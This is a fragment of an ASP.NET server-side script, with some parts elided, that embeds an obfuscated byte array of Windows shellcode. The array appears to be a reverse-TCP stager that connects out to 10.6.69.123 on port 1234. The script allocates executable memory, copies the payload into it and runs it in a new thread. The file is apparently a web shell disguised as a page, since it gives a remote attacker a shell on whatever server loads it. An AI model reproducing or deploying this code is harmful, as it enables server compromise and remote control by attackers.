...
<script runat="server">
    ...
    {
        byte[] gIZZPL8HTs = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,
0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xc0,0xac,
0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,
0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x48,0x18,0x50,0x8b,0x58,0x20,
...
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x06,0x45,0x7b,
0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xd5};
        ...
        IntPtr e5hbG34 = VirtualAlloc(IntPtr.Zero,(UIntPtr)gIZZPL8HTs.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(gIZZPL8HTs,0,e5hbG34,gIZZPL8HTs.Length);
        IntPtr dm1l = IntPtr.Zero;
        IntPtr y6nYtlMl9HLG = CreateThread(IntPtr.Zero,UIntPtr.Zero,e5hbG34,IntPtr.Zero,0,ref dm1l);
    }
</script>
